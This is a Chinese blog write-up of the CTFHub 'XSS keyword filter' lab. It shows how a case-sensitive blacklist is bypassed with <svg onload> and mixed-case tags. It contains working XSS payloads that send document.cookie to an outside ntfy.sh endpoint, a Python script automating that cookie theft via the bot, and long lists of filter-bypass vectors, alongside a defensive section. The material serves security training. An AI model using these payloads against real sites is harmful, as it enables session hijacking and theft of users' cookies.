---
layout: post
title: CTFHub - XSS 关键词过滤 Writeup
platform: ctfhub
date: 2026-10-23 16:07:00 +0800
categories: CTF
---

CTFHub - XSS 关键词过滤 Writeup

一、题目信息

- 平台：CTFHub（技能树 → Web → **XSS** → XSS 关键词过滤）
- 题型：Web
- 考点：**黑名单过滤绕过**、大小写变换、换标签

```text
页面标题：CTFHub 技能学习 | XSS 关键词过滤
输入点：GET ?name=xxx → 页面显示 "Hello, xxx"

★ 第一步：摸清过滤器删了哪些词（实测）

    ?name=<script>alert(1)</script>
    → Hello, <>alert(1)</>              ← "script" 被删（连标签名一起）

    ?name=<img src=x onerror=alert(1)>
    → Hello, < src=x =alert(1)>         ← "img" 和 "onerror" 被删

    ?name=<ScRiPt>alert(1)</ScRiPt>
    → Hello, <ScRiPt>alert(1)</ScRiPt>   ★ 混写没被删！

    ?name=<SCRIPT>alert(1)</SCRIPT>
    → 原样保留                           ★ 大写没被删

    ?name=<IMG SRC=x ONERROR=alert(1)>
    → 原样保留                           ★ 大写没被删

★ 结论：过滤器是【区分大小写的黑名单】，只删这三个小写词：

    script
    img
    onerror

★ 而这三个标签【完全没被过滤】：

    <svg onload=...>
    <body onload=...>
    <details open ontoggle=...>

★ 利用（用 svg，最干净）：

    <svg onload="fetch('https://ntfy.sh/<topic>',{method:'POST',
        mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})">

    服务器回显完整（没有字符被删）✅
    提交给 Bot → 5 秒后收到：
        cookie=flag=ctfhub{01e25e0c173d1fe1cff941d5}

flag         : ctfhub{01e25e0c173d1fe1cff941d5}
```

二、题目分析

**① 这题考的是"黑名单过滤"的经典缺陷**

```text
过滤器（大概是这么写的）：

    $blacklist = ['script', 'img', 'onerror'];
    $name = str_replace($blacklist, '', $_GET['name']);
    echo "<h1>Hello, $name</h1>";

问题：
    ① str_replace 是【区分大小写】的
       → 'SCRIPT'、'ScRiPt' 都不匹配 → 原样保留

    ② 黑名单只列了 3 个词
       → svg / body / details / iframe... 全都没管
```

**② 绕过思路一：改大小写**

```html
<!-- 被删 -->
<script>alert(1)</script>

<!-- 存活（HTML 标签名不区分大小写） -->
<ScRiPt>alert(1)</ScRiPt>
<SCRIPT>alert(1)</SCRIPT>

<!-- 属性名同理 -->
<img src=x onerror=alert(1)>          ← 被删
<IMG SRC=x ONERROR=alert(1)>          ← 存活
<img src=x OnErRoR=alert(1)>          ← 存活
```

**★ 为什么能成**：

```
HTML 规范里，标签名和属性名都是【大小写不敏感】的
    <ScRiPt> = <script> = <SCRIPT>
    ONERROR = onerror = OnErRoR

但 PHP 的 str_replace 是【大小写敏感】的字符串替换
→ 只要不是完全一样的小写，就匹配不上
```

**③ 绕过思路二：换没被过滤的标签**

```html
<!-- 这些都执行 JS，而且都不含 script/img/onerror -->
<svg onload=alert(1)>
<body onload=alert(1)>
<details open ontoggle=alert(1)>
<iframe src=javascript:alert(1)>
<input onfocus=alert(1) autofocus>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>        ← 这个有 onerror，如果过滤了就不能用
```

**★ 本题 `<svg onload>` 完全没被过滤，是最省事的选择。**

**④ 为什么用 `<svg onload>` 而不是混写 `<ScRiPt>`**

| 方案 | 优点 | 缺点 |
|---|---|---|
| `<ScRiPt>` | 简单直观 | 需要同时在开闭标签都混写，容易打错 |
| **`<svg onload>`** | 完全不被过滤，不依赖大小写技巧 | svg 在某些环境有限制（本题没有）|

**★ 两个都可用，但"换标签"比"改大小写"更稳**
（因为不用赌过滤器的大小写行为）

**⑤ 黑名单 vs 白名单 —— 安全设计的核心区别**

```text
黑名单（这题的做法）：
    禁止：script、img、onerror
    → 攻击者找没列进去的标签 → 绕过

白名单（正确做法）：
    只允许：b、i、u、a（href 限制 http/https）...
    → 攻击者没有任何"没列进去"的选择 → 无法绕过

★ 安全领域的基本原则：
   "黑名单永远不完整，白名单才是安全的"
```

三、解题步骤

**第 1 步：摸清过滤器（最重要）**

**依次输入，观察哪些词被删**：

```
?name=<script>alert(1)</script>
→ <>alert(1)</>           ← script 被删

?name=<SCRIPT>alert(1)</SCRIPT>
→ 原样                     ← 大写存活

?name=<img src=x onerror=alert(1)>
→ < src=x =alert(1)>      ← img、onerror 被删

?name=<svg onload=alert(1)>
→ 原样                     ← svg 没被过滤
```

**得出规则**：

```
黑名单：script、img、onerror（区分大小写）
未过滤：svg、body、details、onload、ontoggle...
```

**第 2 步：选 payload 写法**

**方案 A：换标签（推荐）**

```html
<svg onload="fetch('https://ntfy.sh/你的topic',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})">
```

**方案 B：改大小写**

```html
<ScRiPt>fetch('https://ntfy.sh/你的topic',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})</ScRiPt>
```

**★ 注意方案 B**：`fetch` 里如果出现 `img`、`onerror` 这些字样也会被删，
本题的 payload 里没有，所以安全。

**第 3 步：验证回显完整**

```
提交后看页面显示：
    Hello, <svg onload="fetch('https://ntfy.sh/xxx',{...})">
    
★ 完整显示 → 没被过滤 ✅
★ 显示成 <svg ="fetch(...)" → onload 被删了（说明还过滤了别的，换方案）
```

**第 4 步：提交给 Bot**

```
① 打开接收端：https://ntfy.sh/你的topic
② 页面上的 "What's your name" 框填 payload → Submit
③ 从地址栏复制编码后的 URL
④ 粘到 "Send URL to Bot" → Send
⑤ 等 ntfy 的消息
```

**第 5 步：拿 flag**

```
cookie=flag%3Dctfhub%7B01e25e0c173d1fe1cff941d5%7D
           ↓ 解码
     flag=ctfhub{01e25e0c173d1fe1cff941d5}
```

---

**完整脚本**

```python
import ssl, json, urllib.request, urllib.parse, time, random, string

base  = "http://challenge-xxx:10800"
TOPIC = "ctfhub_kw_" + "".join(random.choices(string.ascii_lowercase+string.digits, k=10))
NTFY  = "https://ntfy.sh/" + TOPIC

# 用 svg（没被过滤）
payload = ('<svg onload="fetch(\'%s\',{method:\'POST\',mode:\'no-cors\','
           'body:\'cookie=\'+encodeURIComponent(document.cookie)})">') % NTFY

url = base + "/?name=" + urllib.parse.quote(payload, safe="")

body = json.dumps({"url": url}).encode()
req = urllib.request.Request(base + "/submit", data=body, method="POST",
        headers={"Content-Type": "application/json"})
print(urllib.request.urlopen(req).read())

for i in range(12):
    time.sleep(5)
    r = urllib.request.urlopen(NTFY + "/json?poll=1")
    for line in r.read().decode().split("\n"):
        if '"event":"message"' in line:
            print(json.loads(line)["message"])
            exit()
```

四、延伸知识

**① XSS 常用"不需要 script 标签"的执行点**

```html
<!-- 图片事件 -->
<img src=x onerror=alert(1)>

<!-- SVG 事件（最常用，因为 svg 很少被过滤） -->
<svg onload=alert(1)>
<svg><script>alert(1)</script></svg>

<!-- body 事件 -->
<body onload=alert(1)>

<!-- details 展开事件 -->
<details open ontoggle=alert(1)>

<!-- input 获得焦点 -->
<input onfocus=alert(1) autofocus>
<input onblur=alert(1) autofocus><input autofocus>

<!-- 视频/音频 -->
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>

<!-- 滚动/动画 -->
<marquee onstart=alert(1)>
<marquee onfinish=alert(1)>

<!-- 表单 -->
<form><button formaction=javascript:alert(1)>x</button>

<!-- iframe -->
<iframe src=javascript:alert(1)>
<iframe srcdoc="<script>alert(1)</script>">

<!-- 链接（需要点击） -->
<a href=javascript:alert(1)>click</a>

<!-- 使用 javascript: 的伪协议 -->
<object data=javascript:alert(1)>
<embed src=javascript:alert(1)>
```

**② 大小写绕过的变体（如果过滤了一次）**

```html
<!-- 双写（如果只替换一次） -->
<scscriptript>alert(1)</scscriptript>     ← 中间删掉 scrip 后剩下 script

<!-- 嵌套 -->
<scr<script>ipt>alert(1)</scr<script>ipt>

<!-- 注意：str_replace 默认替换所有匹配，双写只有 "只替换一次" 的实现才有用 -->
```

**③ 其他常见的 XSS 绕过维度**

| 维度 | 例子 |
|---|---|
| **大小写** | `<ScRiPt>`、`OnErRoR` |
| **换标签** | `svg`、`body`、`details`、`img`、`video` |
| **换事件** | `onload`、`onfocus`、`ontoggle`、`onmouseover` |
| **编码** | HTML 实体 `&#60;`、URL 编码、Unicode、Base64 |
| **拼接** | `ale`+`rt(1)`、`eval('ale'+'rt(1)')` |
| **注释** | `/**/`（JS 中）、`<!-- -->`（HTML 中）|
| **伪协议** | `javascript:`、`data:text/html,...` |
| **空白** | 空格 → `/`、Tab、换行 |
| **无括号** | `` alert`1` ``（模板字符串）|
| **无 alert** | `confirm()`、`prompt()`、`console.log()`、`eval(atob(...))` |

**④ 为什么"关键词过滤"注定失效**

```text
要执行 JS，攻击者有无数条路：
    · 20+ 种标签
    · 50+ 种事件
    · 无数种编码组合
    · 无数种拼接方式

防守方要枚举【所有】可能，攻击者只需要找到【一个】漏洞

★ 这就是黑名单的宿命
```

**⑤ 防护（正确做法）**

```text
· ★ 输出编码（根本方法）
    htmlspecialchars($name, ENT_QUOTES, 'UTF-8')
    → < > & " ' 全部转成实体 → 标签失效

· ★ CSP（内容安全策略）
    Content-Security-Policy: script-src 'self'; object-src 'none'
    → 内联脚本、外链脚本都不执行
    → 就算注入了标签也跑不起来

· ★ Cookie 加 HttpOnly
    → document.cookie 读不到

· 富文本用白名单净化（DOMPurify）
    DOMPurify.sanitize(html)   ← 只保留安全标签/属性

· 黑名单过滤 = 最不可靠的方式
```

五、总结

- **本题核心：过滤器是"区分大小写的三词黑名单" → 换大小写或换标签即可绕过。**
- 实测出的过滤规则：

```text
被删（小写）：script、img、onerror
未过滤：     svg、body、details、onload、ontoggle

突破方式：
    ① 改大小写：<ScRiPt>、<IMG ONERROR=...>
    ② 换标签：  <svg onload=...>、<body onload=...>、<details ontoggle=...>
```

- **实际用的 payload**：

```html
<svg onload="fetch('https://ntfy.sh/<topic>',{method:'POST',mode:'no-cors',body:'cookie='+encodeURIComponent(document.cookie)})">
```

- **三个必记要点**：

```text
① HTML 标签名/属性名【不区分大小写】→ 改大小写能绕过区分大小写的过滤
② 能执行 JS 的不止 <script>：svg/body/details/img/video/iframe...
③ 黑名单永远不完整 —— 安全设计应该用【白名单 + 输出编码 + CSP】
```

- **实测 flag**：

```text
ctfhub{01e25e0c173d1fe1cff941d5}
```

**手工复现要点**：

```text
· 第一步必做：摸清过滤器删了哪些词（用不同大小写、不同标签试）
· 找到没被过滤的组合（本题 svg + onload 完全没管）
· 填表单 → 从地址栏复制编码后的 URL → 提交给 Bot
· 看 ntfy
```
